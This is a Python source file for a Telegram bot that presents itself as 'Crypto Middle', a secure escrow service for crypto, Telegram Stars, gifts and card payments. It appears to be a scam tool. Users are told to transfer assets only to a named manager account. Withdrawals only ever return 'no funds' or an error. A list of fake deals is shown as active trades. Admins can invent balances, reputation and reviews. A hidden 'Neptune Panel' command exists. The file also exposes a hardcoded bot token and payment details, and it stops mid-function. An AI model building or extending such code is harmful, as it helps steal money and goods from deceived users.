import asyncio
import re
import random
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Message, InlineKeyboardMarkup, InlineKeyboardButton,
                           CallbackQuery, BotCommand)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command

BOT_TOKEN = "8690519608:AAG7Un6nNe_SVhIbfeWQ2c_gljhPoTwg5Ys"
ADMIN_IDS = [174415647, 713129783, 90283607, 7186944876]

MANAGER_USERNAME = "@giftdealsmanager"
SUPPORT_USERNAME = "@CryptoMiddleSupport"
TON_ADDRESS  = "UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc"
CARD_NUMBER  = "4276 3801 2345 6789"
CARD_HOLDER  = "Александр Ф."
CARD_BANK    = "ВТБ Банк"
SAFETY_PAGE  = "https://telegra.ph/Bezopasnost-sdelok-CryptoMiddle-01-01"

# Валюты — на что идет сделка (предмет)
DEAL_CURRENCIES = [
    ("TON", "💎 TON"),
    ("USDT", "💵 USDT"),
    ("Stars", "⭐️ Stars"),
    ("Gift", "🎁 Gift"),
    ("BTC", "₿ BTC"),
    ("ETH", "Ξ ETH"),
    ("RUB", "💳 RUB"),
    ("NFT", "🖼 NFT"),
]

# В чем получить оплату (для продавца) / чем платить (для покупателя)
PAYMENT_METHODS = [
    ("TON", "💎 TON"),
    ("USDT", "💵 USDT"),
    ("Stars", "⭐️ Stars"),
    ("RUB Card", "💳 Карта RUB"),
    ("Gift", "🎁 Gift"),
    ("BTC", "₿ BTC"),
    ("ETH", "Ξ ETH"),
]

FAKE_DEALS = [
    {"amount": 5,   "desc": "Аккаунт Steam"},
    {"amount": 40,  "desc": "Подписка Spotify"},
    {"amount": 120, "desc": "Игровой ключ"},
    {"amount": 2,   "desc": "Донат в игре"},
    {"amount": 16,  "desc": "VPN на год"},
    {"amount": 75,  "desc": "Аккаунт Netflix"},
    {"amount": 33,  "desc": "Подписка Telegram"},
    {"amount": 200, "desc": "Аккаунт YouTube"},
    {"amount": 8,   "desc": "Промокод магазина"},
    {"amount": 55,  "desc": "Доступ к сервису"},
]

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())

user_data    = {}
deals        = {}
deal_counter = [1000]

# ── helpers ──────────────────────────────────────────────────────────────────

def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {
            "ton_wallet": "", "card_number": "", "card_name": "",
            "stars_username": "", "usdt_wallet": "", "btc_wallet": "",
            "eth_wallet": "",
            "has_requisites": False,
            "balance": 0.0, "reputation": 0,
            "deals_count": 0, "reviews": [], "lang": "ru",
            "turnover": 0.0
        }
    return user_data[uid]

def get_lang(uid):
    return get_user(uid).get("lang", "ru")

def L(uid, key, **kw):
    lang = get_lang(uid)
    t = LANGS.get(lang, LANGS["ru"]).get(key) or LANGS["ru"].get(key, key)
    return t.format(**kw) if kw else t

def gen_deal_id():
    deal_counter[0] += 1
    return f"CD{deal_counter[0]}"

username_map = {}

def reg(msg: Message):
    if msg.from_user and msg.from_user.username:
        username_map[msg.from_user.username.lower()] = msg.from_user.id

def find_uid(q: str):
    q = q.strip()
    if q.startswith("@"):
        return username_map.get(q[1:].lower())
    try:
        uid = int(q)
        return uid if uid in user_data else None
    except ValueError:
        return None

def valid_card(num: str) -> bool:
    digits = re.sub(r"[\s\-]", "", num)
    return digits.isdigit() and len(digits) == 16

def valid_ton(addr: str) -> bool:
    return bool(re.match(r"^[UE]Q[A-Za-z0-9_\-]{46}$", addr.strip()))

def has_req_for(uid, method: str) -> bool:
    """Проверяем есть ли реквизит для выбранного метода оплаты."""
    u = get_user(uid)
    m = method.lower()
    if "ton" in m:   return bool(u.get("ton_wallet"))
    if "usdt" in m:  return bool(u.get("usdt_wallet"))
    if "stars" in m: return bool(u.get("stars_username"))
    if "card" in m or "rub" in m: return bool(u.get("card_number"))
    if "btc" in m:   return bool(u.get("btc_wallet"))
    if "eth" in m:   return bool(u.get("eth_wallet"))
    if "gift" in m or "nft" in m: return True  # не нужен адрес
    return True

def get_req_for(uid, method: str) -> str:
    """Возвращает реквизит для метода."""
    u = get_user(uid)
    m = method.lower()
    if "ton" in m:   return u.get("ton_wallet", "-")
    if "usdt" in m:  return u.get("usdt_wallet", "-")
    if "stars" in m: return u.get("stars_username", "-")
    if "card" in m or "rub" in m:
        return f"{u.get('card_number','-')} ({u.get('card_name','-')})"
    if "btc" in m:   return u.get("btc_wallet", "-")
    if "eth" in m:   return u.get("eth_wallet", "-")
    return "-"

def req_state_for(method: str):
    """Возвращает FSM state для добавления реквизита."""
    m = method.lower()
    if "ton" in m:   return AddReq.ton
    if "usdt" in m:  return AddReq.usdt
    if "stars" in m: return AddReq.stars
    if "card" in m or "rub" in m: return AddReq.card_num
    if "btc" in m:   return AddReq.btc
    if "eth" in m:   return AddReq.eth
    return None

def req_enter_key(method: str) -> str:
    m = method.lower()
    if "ton" in m:   return "enter_ton"
    if "usdt" in m:  return "enter_usdt"
    if "stars" in m: return "enter_stars"
    if "card" in m or "rub" in m: return "enter_card_num"
    if "btc" in m:   return "enter_btc"
    if "eth" in m:   return "enter_eth"
    return "enter_ton"

async def safe_del(msg):
    try:
        await msg.delete()
    except Exception:
        pass

# ── FSM ──────────────────────────────────────────────────────────────────────

class SetBanner(StatesGroup):
    waiting = State()

class AddReq(StatesGroup):
    ton       = State()
    usdt      = State()
    stars     = State()
    card_num  = State()
    card_name = State()
    btc       = State()
    eth       = State()
    # контекст откуда пришли
    _from_deal = State()

class Deal(StatesGroup):
    role        = State()   # buyer / seller
    partner     = State()
    subject     = State()   # на что сделка (валюта/предмет)
    description = State()   # суть
    payment     = State()   # в чём оплата
    amount      = State()

class TopUp(StatesGroup):
    amount = State()

class AdminAction(StatesGroup):
    reputation = State()
    balance    = State()
    review     = State()

# ── texts ────────────────────────────────────────────────────────────────────

_M = MANAGER_USERNAME
_S = SUPPORT_USERNAME

LANGS = {
"ru": {
"welcome": (
    "<b>Добро пожаловать 👋</b>\n\n"
    "<b>Crypto Middle</b> — сервис безопасных сделок.\n\n"
    "<b>Комиссия: 0%</b>\n"
    "<b>Режим: 24/7</b>\n"
    f"<b>Поддержка: {_S}</b>"
),
"btn_deal":      "🔐 Создать сделку",
"btn_req":       "🧾 Реквизиты",
"btn_topup":     "💰 Пополнить баланс",
"btn_withdraw":  "💸 Вывести средства",
"btn_security":  "🛡 Безопасность",
"btn_support":   "📋 Поддержка",
"btn_language":  "🌐 Язык",
"btn_menu":      "📱 В меню",
"btn_back":      "◀️ Назад",
"btn_cancel":    "❌ Отмена",
"btn_agree":     "📍 Подтвердить ознакомление",
"btn_paid":      "💸 Я оплатил",
"btn_manager":   "💬 Написать менеджеру",
"btn_why_safe":  "🛡 Почему безопасно?",
"btn_cur_deals": "📋 Текущие сделки",

"agreement": (
    "<b>Пользовательское соглашение</b>\n\n"
    f"<b>Передача активов только через: {_M}</b>\n\n"
    "<b>Прямые переводы запрещены.</b>\n"
    "<b>Вывод после подтверждения обеими сторонами.</b>\n\n"
    "<b>Нажмите кнопку для подтверждения.</b>"
),

# шаги сделки
"deal_s0_role": (
    "<b>Создание сделки — Шаг 1/6</b>\n\n"
    "<b>Кто вы в этой сделке?</b>"
),
"btn_role_buyer":  "🛒 Покупатель",
"btn_role_seller": "📦 Продавец",

"deal_s1_partner": (
    "<b>Создание сделки — Шаг 2/6</b>\n\n"
    "<b>Введите @username второго участника:</b>\n"
    "<b>Пример: @username</b>"
),
"deal_s2_subject": (
    "<b>Создание сделки — Шаг 3/6</b>\n\n"
    "<b>На что идёт сделка? Выберите предмет/валюту:</b>"
),
"deal_s3_desc": (
    "<b>Создание сделки — Шаг 4/6</b>\n\n"
    "<b>Опишите суть сделки (минимум 8 символов):</b>"
),
"deal_s3_desc_short": "<b>Суть должна быть не менее 8 символов. Введите снова:</b>",

"deal_s4_payment_seller": (
    "<b>Создание сделки — Шаг 5/6</b>\n\n"
    "<b>В чём хотите получить оплату?</b>"
),
"deal_s4_payment_buyer": (
    "<b>Создание сделки — Шаг 5/6</b>\n\n"
    "<b>Выберите вариант для оплаты:</b>"
),
"deal_s5_amount": (
    "<b>Создание сделки — Шаг 6/6</b>\n\n"
    "<b>Введите сумму сделки:</b>"
),

"no_req_for_payment": (
    "<b>У вас нет реквизита для {method}.</b>\n\n"
    "<b>Добавьте его чтобы продолжить.</b>"
),
"no_req_at_all": (
    "<b>Для создания сделки необходимо добавить реквизиты.</b>\n\n"
    "<b>Перейдите в раздел Реквизиты и добавьте хотя бы один способ получения оплаты.</b>"
),

"deal_created": (
    "<b>Сделка создана!</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Участник: {partner}</b>\n"
    "<b>Предмет: {subject}</b>\n"
    "<b>Суть: {description}</b>\n"
    "<b>Сумма: {amount}</b>\n"
    "<b>Оплата: {payment}</b>\n"
    "<b>Ваша роль: {role}</b>\n\n"
    "<b>Ссылка для участника:</b>\n"
    "<code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
    "<b>Отправьте ссылку второму участнику.</b>\n"
    "<b>Условия сделки появятся после того как он перейдёт по ссылке.</b>"
),

# когда второй участник заходит по ссылке
"deal_info_seller": (
    "<b>Информация о сделке</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Предмет: {subject}</b>\n"
    "<b>Суть: {description}</b>\n"
    "<b>Сумма: {amount}</b>\n"
    "<b>Оплата: {payment}</b>\n\n"
    "<b>Ваша роль: Продавец</b>\n\n"
    f"<b>Передайте товар менеджеру: {_M}</b>\n"
    "<b>После подтверждения покупатель отправит оплату.</b>"
),
"deal_info_buyer": (
    "<b>Информация о сделке</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Предмет: {subject}</b>\n"
    "<b>Суть: {description}</b>\n"
    "<b>Сумма: {amount}</b>\n"
    "<b>Оплата: {payment}</b>\n\n"
    "<b>Ваша роль: Покупатель</b>\n\n"
    f"<b>Продавец передаёт товар менеджеру: {_M}</b>\n"
    "<b>Дождитесь подтверждения, затем оплатите.</b>"
),
"deal_joined_notify_creator": (
    "<b>По вашей сделке {deal_id} перешёл участник!</b>\n\n"
    "<b>Участник: {buyer}</b>\n\n"
    "<b>Условия сделки:</b>\n"
    "<b>Предмет: {subject}</b>\n"
    "<b>Суть: {description}</b>\n"
    "<b>Сумма: {amount} | Оплата: {payment}</b>"
),

"own_deal":       "<b>Это ваша собственная сделка.</b>",
"deal_not_found": "<b>Сделка не найдена или уже завершена.</b>",
"deal_link_wait": "<b>Ссылка действительна. Отправьте её участнику — после перехода появятся условия.</b>",

"paid_notify_admin": (
    "<b>Пользователь сообщил об оплате</b>\n\n"
    "<b>Сделка: {deal_id}</b>\n"
    "<b>Пользователь: {user}</b>\n"
    "<b>Сумма: {amount}</b>\n"
    "<b>Оплата: {payment}</b>"
),
"paid_notify_seller": "<b>Покупатель сообщил об оплате по сделке {deal_id}.\nМенеджер проверяет.</b>",
"paid_confirm":       "<b>Уведомление об оплате отправлено менеджеру.\nОжидайте подтверждения.</b>",

"req_title": (
    "<b>Реквизиты</b>\n\n"
    "<b>TON: {ton}</b>\n"
    "<b>USDT (TRC20): {usdt}</b>\n"
    "<b>Stars: {stars}</b>\n"
    "<b>Карта: {card} ({card_name})</b>\n"
    "<b>BTC: {btc}</b>\n"
    "<b>ETH: {eth}</b>"
),
"enter_ton":      "<b>Введите TON адрес (начинается с UQ или EQ):</b>",
"enter_usdt":     "<b>Введите USDT адрес (TRC20):</b>",
"enter_stars":    "<b>Введите ваш @username для получения Stars:</b>",
"enter_card_num": "<b>Введите номер карты (16 цифр):</b>",
"enter_card_name":"<b>Введите имя держателя карты:</b>",
"enter_btc":      "<b>Введите BTC адрес:</b>",
"enter_eth":      "<b>Введите ETH адрес:</b>",

"saved_ton":   "<b>TON адрес сохранён!</b>",
"saved_usdt":  "<b>USDT адрес сохранён!</b>",
"saved_stars": "<b>Stars username сохранён!</b>",
"saved_card":  "<b>Карта сохранена!</b>",
"saved_btc":   "<b>BTC адрес сохранён!</b>",
"saved_eth":   "<b>ETH адрес сохранён!</b>",

"req_card_step2":  "<b>Теперь введите имя держателя карты:</b>",
"req_ton_invalid": "<b>Некорректный TON адрес. Начинается с UQ/EQ, 48 символов.\nВведите снова:</b>",
"req_card_invalid":"<b>Некорректный номер карты. 16 цифр.\nВведите снова:</b>",

"redo_deal": "\n\n<b>Теперь создайте сделку заново.</b>",

"topup_title":          "<b>Пополнение баланса\n\nВыберите способ:</b>",
"topup_enter_amount":   "<b>Введите сумму пополнения:</b>",
"topup_amount_invalid": "<b>Некорректная сумма. Введите число.</b>",
"topup_stars": (
    "<b>Пополнение Stars\n\nСумма: {amount} Stars</b>\n\n"
    f"<b>Отправьте Stars на: {_M}</b>\n\n"
    "<b>Время зачисления: 5-15 минут</b>"
),
"topup_ton": (
    "<b>Пополнение TON\n\nСумма: {amount} TON</b>\n\n"
    f"<code>{TON_ADDRESS}</code>\n\n"
    f"<b>После отправки напишите: {_S}</b>\n\n"
    "<b>Время зачисления: 5-15 минут</b>"
),
"topup_card": (
    "<b>Пополнение картой\n\nСумма: {amount} RUB</b>\n\n"
    f"<b>Банк: {CARD_BANK}\nНомер: <code>{CARD_NUMBER}</code>\nДержатель: {CARD_HOLDER}</b>\n\n"
    "<b>Сохраните чек и нажмите кнопку ниже.</b>\n\n"
    "<b>Время зачисления: 5-15 минут</b>"
),
"topup_nft": (
    "<b>Пополнение NFT/Gift</b>\n\n"
    f"<b>Передайте актив: {_M}</b>\n\n"
    "<b>После проверки — оценка в Stars или TON.\n\nВремя: 5-15 минут</b>"
),

"withdraw_no_funds": "<b>У вас нету средств для вывода.\n\nПополните баланс и попробуйте снова.</b>",
"withdraw_error":    f"<b>Ошибка при выводе.\n\nОбратитесь в поддержку: {_S}</b>",

"security": (
    "<b>Безопасность при передаче активов</b>\n\n"
    f"<b>Передача только через: {_M}</b>\n\n"
    "<b>Прямые транзакции запрещены.</b>\n"
    "<b>Сверяйте сумму и ID сделки.</b>\n"
    "<b>Вывод после подтверждения обеими сторонами.</b>"
),
"lang_choose":    "<b>Выберите язык:</b>",
"lang_set":       "<b>Язык: Русский</b>",
"invalid_username":"<b>Введите корректный @username (начинается с @):</b>",

"cur_deals_title": "<b>Текущие сделки</b>\n\n",
"cur_deal_line":   "<b>#{num} | {amount}$ — {desc}\nПокупатель: {buyer} | Продавец: {seller}\nСтатус: Активна</b>\n\n",

"role_buyer":  "Покупатель",
"role_seller": "Продавец",
},

"en": {
"welcome": (
    "<b>Welcome 👋</b>\n\n"
    "<b>Crypto Middle</b> — secure OTC deal service.\n\n"
    "<b>Commission: 0%</b>\n"
    "<b>Hours: 24/7</b>\n"
    f"<b>Support: {_S}</b>"
),
"btn_deal":      "🔐 Create Deal",
"btn_req":       "🧾 Requisites",
"btn_topup":     "💰 Top Up",
"btn_withdraw":  "💸 Withdraw",
"btn_security":  "🛡 Security",
"btn_support":   "📋 Support",
"btn_language":  "🌐 Language",
"btn_menu":      "📱 Menu",
"btn_back":      "◀️ Back",
"btn_cancel":    "❌ Cancel",
"btn_agree":     "📍 Confirm Agreement",
"btn_paid":      "💸 I Paid",
"btn_manager":   "💬 Write to Manager",
"btn_why_safe":  "🛡 Why is this safe?",
"btn_cur_deals": "📋 Current Deals",

"agreement": (
    "<b>User Agreement</b>\n\n"
    f"<b>Transfer assets only through: {_M}</b>\n\n"
    "<b>Direct transfers are prohibited.</b>\n"
    "<b>Withdrawal after both sides confirm.</b>\n\n"
    "<b>Press the button to confirm.</b>"
),

"deal_s0_role": (
    "<b>Create Deal — Step 1/6</b>\n\n"
    "<b>What is your role in this deal?</b>"
),
"btn_role_buyer":  "🛒 Buyer",
"btn_role_seller": "📦 Seller",

"deal_s1_partner": (
    "<b>Create Deal — Step 2/6</b>\n\n"
    "<b>Enter @username of the second participant:</b>\n"
    "<b>Example: @username</b>"
),
"deal_s2_subject": (
    "<b>Create Deal — Step 3/6</b>\n\n"
    "<b>What is the deal about? Choose the item/currency:</b>"
),
"deal_s3_desc": (
    "<b>Create Deal — Step 4/6</b>\n\n"
    "<b>Describe the deal (minimum 8 characters):</b>"
),
"deal_s3_desc_short": "<b>Description must be at least 8 characters. Try again:</b>",

"deal_s4_payment_seller": (
    "<b>Create Deal — Step 5/6</b>\n\n"
    "<b>In what currency do you want to receive payment?</b>"
),
"deal_s4_payment_buyer": (
    "<b>Create Deal — Step 5/6</b>\n\n"
    "<b>Choose your payment method:</b>"
),
"deal_s5_amount": (
    "<b>Create Deal — Step 6/6</b>\n\n"
    "<b>Enter the deal amount:</b>"
),

"no_req_for_payment": (
    "<b>You don't have a requisite for {method}.</b>\n\n"
    "<b>Add it to continue.</b>"
),
"no_req_at_all": (
    "<b>You need to add requisites before creating a deal.</b>\n\n"
    "<b>Go to Requisites and add at least one payment method.</b>"
),

"deal_created": (
    "<b>Deal created!</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Participant: {partner}</b>\n"
    "<b>Subject: {subject}</b>\n"
    "<b>Description: {description}</b>\n"
    "<b>Amount: {amount}</b>\n"
    "<b>Payment: {payment}</b>\n"
    "<b>Your role: {role}</b>\n\n"
    "<b>Participant link:</b>\n"
    "<code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
    "<b>Send the link to the second participant.</b>\n"
    "<b>Deal terms will appear once they open the link.</b>"
),

"deal_info_seller": (
    "<b>Deal Information</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Subject: {subject}</b>\n"
    "<b>Description: {description}</b>\n"
    "<b>Amount: {amount}</b>\n"
    "<b>Payment: {payment}</b>\n\n"
    "<b>Your role: Seller</b>\n\n"
    f"<b>Transfer the asset to manager: {_M}</b>\n"
    "<b>After confirmation, the buyer will send payment.</b>"
),
"deal_info_buyer": (
    "<b>Deal Information</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Subject: {subject}</b>\n"
    "<b>Description: {description}</b>\n"
    "<b>Amount: {amount}</b>\n"
    "<b>Payment: {payment}</b>\n\n"
    "<b>Your role: Buyer</b>\n\n"
    f"<b>Seller transfers the asset to manager: {_M}</b>\n"
    "<b>Wait for confirmation, then send payment.</b>"
),
"deal_joined_notify_creator": (
    "<b>A participant joined your deal {deal_id}!</b>\n\n"
    "<b>Participant: {buyer}</b>\n\n"
    "<b>Deal terms:</b>\n"
    "<b>Subject: {subject}</b>\n"
    "<b>Description: {description}</b>\n"
    "<b>Amount: {amount} | Payment: {payment}</b>"
),

"own_deal":       "<b>This is your own deal.</b>",
"deal_not_found": "<b>Deal not found or already closed.</b>",
"deal_link_wait": "<b>Link is valid. Send it to the participant — terms will appear once they open it.</b>",

"paid_notify_admin": (
    "<b>User reported payment</b>\n\n"
    "<b>Deal: {deal_id}</b>\n"
    "<b>User: {user}</b>\n"
    "<b>Amount: {amount}</b>\n"
    "<b>Payment: {payment}</b>"
),
"paid_notify_seller": "<b>Buyer reported payment for deal {deal_id}.\nManager is verifying.</b>",
"paid_confirm":       "<b>Payment notification sent.\nWaiting for confirmation.</b>",

"req_title": (
    "<b>Requisites</b>\n\n"
    "<b>TON: {ton}</b>\n"
    "<b>USDT (TRC20): {usdt}</b>\n"
    "<b>Stars: {stars}</b>\n"
    "<b>Card: {card} ({card_name})</b>\n"
    "<b>BTC: {btc}</b>\n"
    "<b>ETH: {eth}</b>"
),
"enter_ton":      "<b>Enter TON address (starts with UQ or EQ):</b>",
"enter_usdt":     "<b>Enter USDT address (TRC20):</b>",
"enter_stars":    "<b>Enter your @username to receive Stars:</b>",
"enter_card_num": "<b>Enter card number (16 digits):</b>",
"enter_card_name":"<b>Enter cardholder name:</b>",
"enter_btc":      "<b>Enter BTC address:</b>",
"enter_eth":      "<b>Enter ETH address:</b>",

"saved_ton":   "<b>TON address saved!</b>",
"saved_usdt":  "<b>USDT address saved!</b>",
"saved_stars": "<b>Stars username saved!</b>",
"saved_card":  "<b>Card saved!</b>",
"saved_btc":   "<b>BTC address saved!</b>",
"saved_eth":   "<b>ETH address saved!</b>",

"req_card_step2":  "<b>Now enter the cardholder name:</b>",
"req_ton_invalid": "<b>Invalid TON address. Starts with UQ/EQ, 48 chars.\nEnter again:</b>",
"req_card_invalid":"<b>Invalid card number. 16 digits.\nEnter again:</b>",

"redo_deal": "\n\n<b>Now create the deal again.</b>",

"topup_title":          "<b>Top Up Balance\n\nChoose method:</b>",
"topup_enter_amount":   "<b>Enter the top-up amount:</b>",
"topup_amount_invalid": "<b>Invalid amount. Enter a number.</b>",
"topup_stars": (
    "<b>Top Up Stars\n\nAmount: {amount} Stars</b>\n\n"
    f"<b>Send Stars to: {_M}</b>\n\n"
    "<b>Processing time: 5-15 minutes</b>"
),
"topup_ton": (
    "<b>Top Up TON\n\nAmount: {amount} TON</b>\n\n"
    f"<code>{TON_ADDRESS}</code>\n\n"
    f"<b>After sending contact: {_S}</b>\n\n"
    "<b>Processing time: 5-15 minutes</b>"
),
"topup_card": (
    "<b>Top Up Card\n\nAmount: {amount} RUB</b>\n\n"
    f"<b>Bank: {CARD_BANK}\nNumber: <code>{CARD_NUMBER}</code>\nHolder: {CARD_HOLDER}</b>\n\n"
    "<b>Save receipt and press button below.\n\nProcessing time: 5-15 minutes</b>"
),
"topup_nft": (
    "<b>Top Up NFT/Gift</b>\n\n"
    f"<b>Transfer to: {_M}</b>\n\n"
    "<b>After verification — valuation in Stars or TON.\n\nTime: 5-15 minutes</b>"
),

"withdraw_no_funds": "<b>You have no funds to withdraw.\n\nTop up your balance first.</b>",
"withdraw_error":    f"<b>Withdrawal error.\n\nContact support: {_S}</b>",

"security": (
    "<b>Asset Transfer Security</b>\n\n"
    f"<b>Transfer only through: {_M}</b>\n\n"
    "<b>Direct transactions are prohibited.</b>\n"
    "<b>Verify amount and deal ID.</b>\n"
    "<b>Withdrawal after both sides confirm.</b>"
),
"lang_choose":    "<b>Choose language:</b>",
"lang_set":       "<b>Language: English</b>",
"invalid_username":"<b>Enter a valid @username (starts with @):</b>",

"cur_deals_title": "<b>Current Deals</b>\n\n",
"cur_deal_line":   "<b>#{num} | {amount}$ — {desc}\nBuyer: {buyer} | Seller: {seller}\nStatus: Active</b>\n\n",

"role_buyer":  "Buyer",
"role_seller": "Seller",
},
}

# ── keyboards ────────────────────────────────────────────────────────────────

def main_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_deal"),      callback_data="deal"),
         InlineKeyboardButton(text=L(uid,"btn_req"),       callback_data="requisites")],
        [InlineKeyboardButton(text=L(uid,"btn_topup"),     callback_data="topup"),
         InlineKeyboardButton(text=L(uid,"btn_withdraw"),  callback_data="withdraw")],
        [InlineKeyboardButton(text=L(uid,"btn_security"),  callback_data="security"),
         InlineKeyboardButton(text=L(uid,"btn_support"),   url=f"https://t.me/{_S.lstrip('@')}")],
        [InlineKeyboardButton(text=L(uid,"btn_cur_deals"), callback_data="cur_deals"),
         InlineKeyboardButton(text=L(uid,"btn_language"),  callback_data="language")],
    ])

def back_kb(uid, cb="menu"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data=cb)],
    ])

def cancel_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")],
    ])

def agreement_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_agree"), callback_data="confirm_agreement")],
        [InlineKeyboardButton(text=L(uid,"btn_back"),  callback_data="menu")],
    ])

def role_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_role_buyer"),  callback_data="drole_buyer"),
         InlineKeyboardButton(text=L(uid,"btn_role_seller"), callback_data="drole_seller")],
        [InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")],
    ])

def subject_kb(uid):
    """Клавиатура выбора предмета сделки."""
    rows = []
    row = []
    for code, label in DEAL_CURRENCIES:
        row.append(InlineKeyboardButton(text=label, callback_data=f"dsubj_{code}"))
        if len(row) == 2:
            rows.append(row); row = []
    if row: rows.append(row)
    rows.append([InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def payment_kb(uid):
    """Клавиатура выбора метода оплаты."""
    rows = []
    row = []
    for code, label in PAYMENT_METHODS:
        row.append(InlineKeyboardButton(text=label, callback_data=f"dpay_{code}"))
        if len(row) == 2:
            rows.append(row); row = []
    if row: rows.append(row)
    rows.append([InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def deal_action_kb(uid, deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_paid"),    callback_data=f"paid_{deal_id}")],
        [InlineKeyboardButton(text=L(uid,"btn_manager"), url=f"https://t.me/{_M.lstrip('@')}")],
        [InlineKeyboardButton(text=L(uid,"btn_why_safe"),url=SAFETY_PAGE)],
        [InlineKeyboardButton(text=L(uid,"btn_back"),    callback_data="menu")],
    ])

def req_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON",   callback_data="req_ton"),
         InlineKeyboardButton(text="💵 USDT",  callback_data="req_usdt")],
        [InlineKeyboardButton(text="⭐️ Stars", callback_data="req_stars"),
         InlineKeyboardButton(text="💳 Карта", callback_data="req_card")],
        [InlineKeyboardButton(text="₿ BTC",    callback_data="req_btc"),
         InlineKeyboardButton(text="Ξ ETH",    callback_data="req_eth")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
    ])

def topup_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐️ Stars", callback_data="topup_stars"),
         InlineKeyboardButton(text="💎 TON",   callback_data="topup_ton")],
        [InlineKeyboardButton(text="💳 Карта", callback_data="topup_card"),
         InlineKeyboardButton(text="🎁 NFT/Gift", callback_data="topup_nft")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
    ])

def topup_paid_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_paid"), callback_data="paid_topup")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="topup")],
    ])

def language_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="setlang_ru"),
         InlineKeyboardButton(text="🇬🇧 English",  callback_data="setlang_en")],
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Баннер",       callback_data="adm_banner"),
         InlineKeyboardButton(text="Статистика",   callback_data="adm_stats")],
        [InlineKeyboardButton(text="Пользователи", callback_data="adm_users"),
         InlineKeyboardButton(text="Репутация",    callback_data="adm_reputation")],
        [InlineKeyboardButton(text="Отзыв",        callback_data="adm_review"),
         InlineKeyboardButton(text="Баланс",       callback_data="adm_balance")],
        [InlineKeyboardButton(text="Сделки",       callback_data="adm_deals")],
    ])

# ── show menu ────────────────────────────────────────────────────────────────

async def show_menu(message: Message, uid: int):
    banner  = user_data.get("_banner")
    welcome = L(uid, "welcome")
    kb      = main_kb(uid)
    if banner and banner.get("photo_id"):
        try:
            await message.answer_photo(photo=banner["photo_id"],
                                       caption=banner.get("caption") or welcome,
                                       parse_mode="HTML", reply_markup=kb)
            return
        except Exception:
            pass
    await message.answer(welcome, parse_mode="HTML", reply_markup=kb)

# ── /start ───────────────────────────────────────────────────────────────────

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    uid = message.from_user.id
    get_user(uid)
    if message.from_user.username:
        username_map[message.from_user.username.lower()] = uid
    await state.clear()

    args = message.text.split()
    if len(args) > 1 and args[1].startswith("deal_"):
        deal_id = args[1].replace("deal_", "", 1)
        deal    = deals.get(deal_id)
        if not deal:
            await message.answer(L(uid, "deal_not_found"), reply_markup=main_kb(uid))
            return
        if deal["uid"] == uid:
            await message.answer(L(uid, "own_deal"), reply_markup=main_kb(uid))
            return

        buyer_name = f"@{message.from_user.username}" if message.from_user.username else f"ID:{uid}"
        creator_role = deal.get("creator_role", "seller")
        # тот кто зашёл — противоположная роль
        joiner_role = "buyer" if creator_role == "seller" else "seller"

        if joiner_role == "seller":
            text_key = "deal_info_seller"
        else:
            text_key = "deal_info_buyer"

        await message.answer(
            L(uid, text_key,
              deal_id=deal_id,
              subject=deal.get("subject", "-"),
              description=deal["description"],
              amount=deal["amount"],
              payment=deal.get("payment", "-")),
            parse_mode="HTML",
            reply_markup=deal_action_kb(uid, deal_id)
        )

        # уведомить создателя
        creator_uid = deal["uid"]
        try:
            await bot.send_message(
                creator_uid,
                L(creator_uid, "deal_joined_notify_creator",
                  deal_id=deal_id, buyer=buyer_name,
                  subject=deal.get("subject","-"),
                  description=deal["description"],
                  amount=deal["amount"],
                  payment=deal.get("payment","-")),
                parse_mode="HTML",
                reply_markup=deal_action_kb(creator_uid, deal_id)
            )
        except Exception:
            pass
        return

    await show_menu(message, uid)

# ── neptune ───────────────────────────────────────────────────────────────────

@dp.message(Command("neptunteam"))
async def cmd_neptune(message: Message):
    uid = message.from_user.id
    u   = get_user(uid)
    reviews = u.get("reviews", [])
    rev_text = "\n".join(f"<b>- {r}</b>" for r in reviews[-5:]) if reviews else "<b>Нет отзывов</b>"
    await message.answer(
        f"<b>Neptune Panel</b>\n\n"
        f"<b>Баланс: {u.get('balance',0.0)}</b>\n"
